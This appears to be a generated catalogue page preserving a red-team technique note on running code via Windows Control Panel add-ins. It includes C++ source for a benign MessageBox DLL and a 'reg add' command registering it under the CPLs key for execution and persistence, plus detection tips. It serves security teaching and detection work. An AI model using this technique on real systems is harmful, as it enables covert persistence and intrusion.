---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Code Execution through Control Panel Add-ins

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-code-execution-through-control-panel-add-ins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/code-execution-through-control-panel-add-ins.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Code Execution through Control Panel Add-ins](../../topics/offensive-security/code-execution-through-control-panel-add-ins.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-execution-code-execution-through-control-panel-add-ins |
| name | Code Execution through Control Panel Add-ins |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-execution/code-execution-through-control-panel-add-ins.md |

## Preserved Source Material

````yaml
_asset_filenames:
- control-panel-item-addin.gif
- image (573).png
- image (574).png
_body: "# Code Execution through Control Panel Add-ins\n\nIt's possible to force explorer.exe to load your DLL that is compiled\
  \ as a Control Panel Item and is registered as a Control Panel Add-in.\n\n{% hint style=\"info\" %}\nThis technique could\
  \ also be considered for persistence.\n{% endhint %}\n\n## Execution\n\nLet's compile our control panel item (which is a\
  \ simple DLL with an exported function `Cplapplet`) from the below code:\n\n```cpp\n#include <Windows.h>\n#include \"pch.h\"\
  \n\n//Cplapplet\nextern \"C\" __declspec(dllexport) LONG Cplapplet(\n    HWND hwndCpl,\n    UINT msg,\n    LPARAM lParam1,\n\
  \    LPARAM lParam2\n)\n{\n    MessageBoxA(NULL, \"Hey there, I am now your control panel item you know.\", \"Control Panel\"\
  , 0);\n    return 1;\n}\n\nBOOL APIENTRY DllMain(HMODULE hModule,\n    DWORD  ul_reason_for_call,\n    LPVOID lpReserved\n\
  )\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n    {\n        Cplapplet(NULL, NULL, NULL, NULL);\n\
  \    }\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n\
  \    return TRUE;\n}\n```\n\nLet's now register our control panel item as an add-in (defenders beware of these registry\
  \ modifications):\n\n```\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\CPLs\" /v spotless\
  \ /d \"C:\\labs\\cplAddin\\cplAddin\\x64\\Release\\cplAddin2.dll\" /f\n```\n\n![](<../../.gitbook/assets/image (573).png>)\n\
  \nNow, whenever the Control Panel is opened, our DLL will be injected into explorer.exe and our code will execute:\n\n![](../../.gitbook/assets/control-panel-item-addin.gif)\n\
  \nBelow shows that our DLL is injected into explorer.exe:\n\n![](<../../.gitbook/assets/image (574).png>)\n\n## Detection\n\
  \n* Look for modifications in the following registry key: `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\\
  CPLs`\n* Look for / prevent DLLs from loading from unsecure locations\n\n## References\n\n[https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET\\\
  _InvisiMole.pdf](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET\\_InvisiMole.pdf)"
_relative_path: offensive-security/code-execution/code-execution-through-control-panel-add-ins.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/code-execution-through-control-panel-add-ins.md
````
